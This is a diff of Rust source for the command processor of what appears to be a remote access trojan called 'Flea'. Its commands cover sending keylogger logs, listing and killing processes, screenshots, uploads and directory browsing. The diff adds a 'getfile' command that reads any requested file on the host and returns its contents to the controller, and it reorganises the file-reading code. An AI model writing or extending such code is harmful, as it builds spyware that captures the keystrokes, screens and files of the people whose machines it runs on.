@@ -4,7 +4,7 @@ extern crate serde;
 
 use serde::{Serialize, Deserialize};
 use std::sync::{Arc, Mutex};
-use std::{str, fs::File, io::Read, env, path::PathBuf};
+use std::{str, env, path::PathBuf};
 use log::{debug, error};
 use chrono::{DateTime, Utc};
 use crate::fileserver::FileServer;
@@ -21,7 +21,8 @@ const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
 const KILL_COMMAND: &'static str = "kill";
 const UPLOAD_COMMAND: &'static str = "upload";
-const GET_FILES_COMMAND: &'static str = "getfiles";
+const DIR_COMMAND: &'static str = "dir";
+const GET_FILE_COMMAND: &'static str = "getfile";
 const CHANGE_DIRECTORY_COMMAND: &'static str = "cd";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
@@ -82,17 +83,6 @@ impl CommandProcessor
         let now: DateTime<Utc> = Utc::now();
         let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
         env::temp_dir().as_path().join(file_name)
-    }
-
-    /// Reads a binary file and returns its content as a u8 vector
-    /// * file_path - a path to the file to read
-    /// * returns a vector of u8 bytes or an error
-    fn read_binary_file(&self, file_path: &PathBuf) -> Result<Vec<u8>, std::io::Error>
-    {
-        let mut file = File::open(file_path)?;
-        let mut data = Vec::new();
-        file.read_to_end(&mut data)?;
-        Ok(data)
     }
 
     /// Convert a byte array into string digits
@@ -263,7 +253,7 @@ impl FleaCommand for CommandProcessor
                 return self.change_directory(value, file_server);
             },
 
-            GET_FILES_COMMAND =>
+            DIR_COMMAND =>
             {
                 if let Ok(files) = file_server.lock().unwrap().get_curr_dir_content()
                 {
@@ -274,6 +264,23 @@ impl FleaCommand for CommandProcessor
                 {
                     debug!("Couldn't get files");
                     return "Couldn't get files".to_string();
+                }
+            },
+
+            GET_FILE_COMMAND =>
+            {
+                return match file_server.lock().unwrap().read_binary_file(value)
+                {
+                    Ok(x) =>
+                    {
+                        debug!("File returned");
+                        self.bytes_to_string(&x)
+                    },
+                    Err(x) =>
+                    {
+                        error!("Error: {}", x);
+                        return x.to_string()
+                    }
                 }
             },
 
@@ -292,7 +299,7 @@ impl FleaCommand for CommandProcessor
                     }
                 };
 
-                return match self.read_binary_file(&current_path)
+                return match file_server.lock().unwrap().read_binary_file_by_path(&current_path)
                 {
                     Ok(x) =>
                     {
